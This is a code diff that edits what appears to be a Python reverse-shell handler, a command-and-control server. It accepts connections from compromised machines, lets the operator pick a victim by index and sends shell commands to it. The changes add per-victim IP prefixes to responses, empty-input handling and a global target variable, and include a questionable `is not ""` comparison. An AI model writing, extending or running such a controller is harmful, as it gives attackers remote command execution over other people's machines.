@@ -1,7 +1,5 @@
 import socket
-import sys
 import threading
-import time
 from queue import Queue
 
 THREADS = 2
@@ -55,7 +53,7 @@ def accept_connections():
             connections.append(connection)
             addresses.append(address)
 
-            print(f"[+] New Connection at {address[0]}, Port {address[1]}")
+            print(f"\n[+] New Connection at {address[0]}, Port {address[1]}")
 
         except Exception as e:
             print(f"[!] Error accepting connections: {e}")
@@ -65,6 +63,9 @@ def start_shell():
     while True:
         cmd = input("shell>")
 
+        if cmd == "":
+            cmd = input("shell>")
+
         if cmd == "list":
             list_connections()
 
@@ -73,7 +74,7 @@ def start_shell():
             if connection is not None:
                 send_target_commands(connection)
 
-        else:
+        elif cmd is not "":
             print(f"Invalid Command: {cmd}")
 
 
@@ -96,6 +97,7 @@ def list_connections():
 
 def get_target(cmd):
     try:
+        global target
         target = cmd.replace("select ", "")
         target = int(target)
         connection = connections[target]
@@ -121,7 +123,7 @@ def send_target_commands(connection):
                 connection.send(str.encode(cmd))
 
                 client_response = connection.recv(20480).decode("utf-8") # 1024 = bytes to read at once, utf-8 = encoding type
-                print(client_response, end="")
+                print(f"({addresses[target][0]}) " + client_response, end="")
         except:
             print("[!] Error sending commands")
             break
@@ -150,8 +152,6 @@ def create_jobs():
         queue.put(x)
 
     queue.join()
-
-
 
 
 if __name__ == "__main__":
